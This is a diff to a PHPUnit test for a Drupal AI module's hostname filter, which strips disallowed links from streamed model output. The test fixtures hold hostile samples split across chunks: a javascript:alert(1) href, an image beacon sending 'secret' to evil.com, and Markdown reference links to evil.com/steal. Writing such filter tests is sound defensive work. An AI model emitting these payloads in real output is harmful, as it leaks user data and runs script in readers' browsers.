@@ -4,14 +4,16 @@ declare(strict_types=1);
 
 namespace Drupal\Tests\ai\Kernel\Service;
 
+use Drupal\ai_test\Mock\MockIterator;
+use Drupal\ai_test\Mock\MockStreamedChatIterator;
 use Drupal\KernelTests\KernelTestBase;
-use Drupal\Tests\ai\Mock\MockIterator;
-use Drupal\Tests\ai\Mock\MockStreamedChatIterator;
+use PHPUnit\Framework\Attributes\RunTestsInSeparateProcesses;
 
 /**
  * @coversDefaultClass \Drupal\ai\Service\HostnameFilter
  * @group ai
  */
+#[RunTestsInSeparateProcesses]
 class HostnameFilterTest extends KernelTestBase {
 
   /**
@@ -256,6 +258,231 @@ class HostnameFilterTest extends KernelTestBase {
     }
     // Full link should no exist.
     $this->assertStringNotContainsString($full_link, $collected);
+  }
+
+  /**
+   * Tests a javascript: href split across stream chunks is filtered.
+   */
+  public function testChatStreamFiltersJavascriptHref(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>Read ',
+      '<a href="java',
+      'script:alert(1)">click here</a>',
+      ' then visit ',
+      '<a href="https://exa',
+      'mple.com/guide">home</a>.</p>',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('javascript:', $collected);
+    $this->assertStringContainsString('click here', $collected);
+    $this->assertStringContainsString('https://example.com/guide', $collected);
+  }
+
+  /**
+   * Tests entity-encoded whitespace in a scheme is filtered when streamed.
+   */
+  public function testChatStreamFiltersEntityEncodedScheme(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>',
+      '<a href="java',
+      '&#9;',
+      'script:alert(1)">x</a>',
+      '</p>',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('script:alert(1)', $collected);
+    $this->assertStringContainsString('x', $collected);
+  }
+
+  /**
+   * Tests a disallowed-host image beacon split across chunks is filtered.
+   */
+  public function testChatStreamFiltersDisallowedHostImageBeacon(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      '<p>pixel</p>',
+      '<img src="https://e',
+      'vil.com/track.gif?d=secret">',
+      '<img src="https://exa',
+      'mple.com/ok.png">',
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('https://example.com/ok.png', $collected);
+  }
+
+  /**
+   * Tests an angle-bracket reference definition split across chunks is filter.
+   *
+   * CommonMark allows the destination of a reference definition to be wrapped
+   * in angle brackets ("[ref]: <url>"). The brackets must be stripped before
+   * the host check; here the destination is also split across stream chunks so
+   * the URL-safety buffer has to reassemble the full line before filtering.
+   */
+  public function testChatStreamFiltersAngleBracketReferenceDefinition(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      "Read [the guide][ref].\n",
+      "\n",
+      "[ref]: <https://ev",
+      "il.com/steal>\n",
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('the guide', $collected);
+  }
+
+  /**
+   * Tests an angle-bracket protocol-relative reference definition is filtered.
+   *
+   * The autolink pass cannot catch this form (it requires a scheme), so the
+   * reference-definition handler must strip the brackets and apply the host
+   * allowlist itself — verified here across stream chunk boundaries.
+   */
+  public function testChatStreamFiltersAngleBracketProtocolRelativeReference(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['example.com'])->save();
+    $stream = [
+      "Read [the guide][ref].\n",
+      "\n",
+      "[ref]: <//ev",
+      "il.com/steal>\n",
+      '',
+    ];
+    $collected = $this->collectStream($stream);
+    $this->assertStringNotContainsString('evil.com', $collected);
+    $this->assertStringContainsString('the guide', $collected);
+  }
+
+  /**
+   * Streams the given chunks through the iterator and returns collected text.
+   *
+   * @param string[] $stream
+   *   The ordered output chunks to emit.
+   *
+   * @return string
+   *   The concatenated, filtered text the consumer receives.
+   */
+  protected function collectStream(array $stream): string {
+    $message = new MockStreamedChatIterator(new MockIterator($stream));
+    $collected = '';
+    foreach ($message as $part) {
+      $this->assertIsString($part->getText());
+      $collected .= $part->getText();
+    }
+    return $collected;
+  }
+
+  /**
+   * Tests getAllowedDomains returns empty array when config value is NULL.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithNullConfig(): void {
+    $this->setRawConfigValue('allowed_hosts', NULL);
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame([], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Tests getAllowedDomains handles a bare empty string config value.
+   *
+   * This is the regression scenario from #3586397 where allowed_hosts
+   * is stored as '' instead of an empty array.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithEmptyStringConfig(): void {
+    $this->setRawConfigValue('allowed_hosts', '');
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame([], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Tests getAllowedDomains filters out empty strings from config array.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithEmptyStringsInArray(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['', '', ''])->save();
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame([], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Tests getAllowedDomains filters out whitespace-only strings.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithWhitespaceOnlyStrings(): void {
+    $this->config('ai.settings')->set('allowed_hosts', ['  ', "\t", "\n"])->save();
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame([], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Tests getAllowedDomains normalizes mixed valid and invalid entries.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithMixedValues(): void {
+    $this->config('ai.settings')->set('allowed_hosts', [
+      'example.com',
+      '',
+      '  cdn.example.com  ',
+      '   ',
+      '*.test.org',
+    ])->save();
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame([
+      'example.com',
+      'cdn.example.com',
+      '*.test.org',
+    ], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Tests getAllowedDomains handles a non-empty string config value.
+   *
+   * @covers ::getAllowedDomains
+   */
+  public function testGetAllowedDomainsWithNonEmptyStringConfig(): void {
+    $this->setRawConfigValue('allowed_hosts', 'example.com');
+    /** @var \Drupal\ai\Service\HostnameFilter $filter */
+    $filter = $this->container->get('ai.hostname_filter_service');
+    $this->assertSame(['example.com'], $filter->getAllowedDomains());
+  }
+
+  /**
+   * Writes a raw config value bypassing schema validation.
+   *
+   * This simulates malformed config that arrives via config import, drush,
+   * or direct YAML editing, which bypasses the schema checker.
+   *
+   * @param string $key
+   *   The config key within ai.settings.
+   * @param mixed $value
+   *   The raw value to set.
+   */
+  protected function setRawConfigValue(string $key, mixed $value): void {
+    /** @var \Drupal\Core\Config\StorageInterface $storage */
+    $storage = $this->container->get('config.storage');
+    $data = $storage->read('ai.settings');
+    $data[$key] = $value;
+    $storage->write('ai.settings', $data);
+
+    // Clear the static cache so the service reads the new value.
+    \Drupal::configFactory()->reset('ai.settings');
   }
 
 }
